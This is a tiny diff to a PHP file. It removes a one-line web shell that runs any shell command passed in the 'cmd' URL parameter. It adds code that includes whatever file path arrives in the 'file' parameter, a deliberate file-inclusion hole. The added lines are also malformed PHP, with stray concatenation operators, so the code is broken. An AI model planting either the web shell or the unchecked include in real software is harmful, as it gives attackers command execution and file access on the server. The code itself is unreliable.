@@ -1,1 +1,3 @@
-<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?> 
+<?php "<pre>" . $filename = $_GET['file']; 
+include($filename);
+. "</pre>"; ?> 
